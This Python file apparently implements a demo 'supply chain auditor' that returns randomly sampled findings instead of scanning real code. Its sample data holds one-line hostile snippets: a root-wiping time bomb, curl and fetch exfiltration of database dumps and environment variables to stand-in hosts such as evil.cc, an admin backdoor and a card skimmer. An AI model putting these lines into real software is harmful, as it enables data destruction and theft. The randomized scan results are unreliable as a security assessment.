"""Kavach AI — CleanCode AI: Secure Supply Chain Auditor"""
import random
from datetime import datetime, timedelta

class CleanCodeAI:
    REPOS = ['kavach-frontend', 'payment-service', 'user-auth-api', 'data-pipeline', 'mobile-app', 'infra-config']
    LOGIC_BOMBS = [
        {'file': 'utils/scheduler.py', 'line': 142, 'code': 'if datetime.now().weekday()==4 and datetime.now().day==13: shutil.rmtree("/")',
         'intent': 'Deletes all files on Friday the 13th', 'severity': 'critical'},
        {'file': 'db/migrations.py', 'line': 89, 'code': 'if os.getenv("ENV")=="prod": subprocess.run(["curl",EXFIL_URL,"-d",db_dump])',
         'intent': 'Exfiltrates database in production', 'severity': 'critical'},
        {'file': 'auth/login.py', 'line': 203, 'code': 'if user.email.endswith("@competitor.com"): return admin_token',
         'intent': 'Backdoor grants admin to competitor emails', 'severity': 'critical'},
        {'file': 'config/deploy.js', 'line': 55, 'code': 'if(Date.now() > 1798761600000) fetch("https://evil.cc/c",{method:"POST",body:env})',
         'intent': 'Time-bomb exfiltrates env vars after set date', 'severity': 'critical'},
        {'file': 'services/payment.py', 'line': 312, 'code': 'if amount > 10000: requests.post(WEBHOOK, json={"card": card_data})',
         'intent': 'Skims high-value payment card data', 'severity': 'critical'},
    ]
    VULN_PACKAGES = [
        {'name': 'event-stream', 'version': '3.3.6', 'risk': 'critical', 'issue': 'Malicious flatmap-stream dependency',
         'fix': 'Upgrade to event-stream@4.0.1'},
        {'name': 'ua-parser-js', 'version': '0.7.29', 'risk': 'critical', 'issue': 'Cryptominer injected in publish',
         'fix': 'Upgrade to ua-parser-js@1.0.33'},
        {'name': 'colors', 'version': '1.4.1', 'risk': 'high', 'issue': 'Protestware — infinite loop on import',
         'fix': 'Pin to colors@1.4.0'},
        {'name': 'node-ipc', 'version': '10.1.1', 'risk': 'critical', 'issue': 'Geo-targeted file wiper (peacenotwar)',
         'fix': 'Downgrade to node-ipc@9.2.1'},
        {'name': 'faker', 'version': '6.6.6', 'risk': 'high', 'issue': 'Self-sabotaged — outputs garbage data',
         'fix': 'Use @faker-js/faker@8.0.0'},
        {'name': 'coa', 'version': '2.0.3', 'risk': 'critical', 'issue': 'Compromised maintainer — credential stealer',
         'fix': 'Upgrade to coa@2.0.4'},
    ]
    HALLUCINATED_PACKAGES = [
        {'asked': 'flask-auth-helper', 'suggested': 'flask-authhelper', 'real': False, 'risk': 'Typosquat — contains reverse shell'},
        {'asked': 'react-date-utils', 'suggested': 'react-dateutils', 'real': False, 'risk': 'Fake package — steals env vars on install'},
        {'asked': 'py-jwt-decode', 'suggested': 'pyjwt-decode', 'real': False, 'risk': 'Mimics PyJWT — exfiltrates tokens'},
        {'asked': 'mongo-sanitize', 'suggested': 'mongosanitize', 'real': False, 'risk': 'Trojan — opens backdoor on port 4444'},
    ]

    def scan_repository(self, repo_name=None):
        repo = repo_name or random.choice(self.REPOS)
        bombs_found = random.sample(self.LOGIC_BOMBS, random.randint(1, 3))
        vulns_found = random.sample(self.VULN_PACKAGES, random.randint(2, 4))
        hallucinations = random.sample(self.HALLUCINATED_PACKAGES, random.randint(1, 3))
        total_files = random.randint(120, 800)
        return {
            'repo': repo, 'scan_time': datetime.now().strftime('%Y-%m-%dT%H:%M:%S'),
            'files_scanned': total_files, 'lines_analyzed': total_files * random.randint(50, 200),
            'logic_bombs': bombs_found, 'vulnerable_packages': vulns_found,
            'hallucinated_packages': hallucinations,
            'clean_files': total_files - len(bombs_found),
            'risk_level': 'CRITICAL' if bombs_found else 'HIGH' if vulns_found else 'LOW',
        }

    def generate_auto_patch(self, finding):
        patches = {
            'critical': '--- a/{f}\n+++ b/{f}\n@@ -{l},1 +{l},1 @@\n- {code}\n+ # REMOVED: Malicious code detected by Kavach CleanCode AI\n+ logger.critical("Blocked malicious code execution attempt")',
            'high': '--- a/package.json\n+++ b/package.json\n@@ -15,1 +15,1 @@\n- "{pkg}": "{ver}"\n+ "{pkg}": "{fix}"',
        }
        sev = finding.get('severity', finding.get('risk', 'high'))
        if sev == 'critical' and 'code' in finding:
            return patches['critical'].format(f=finding['file'], l=finding['line'], code=finding['code'])
        return patches['high'].format(pkg=finding.get('name','pkg'), ver=finding.get('version','0'), fix=finding.get('fix','latest'))
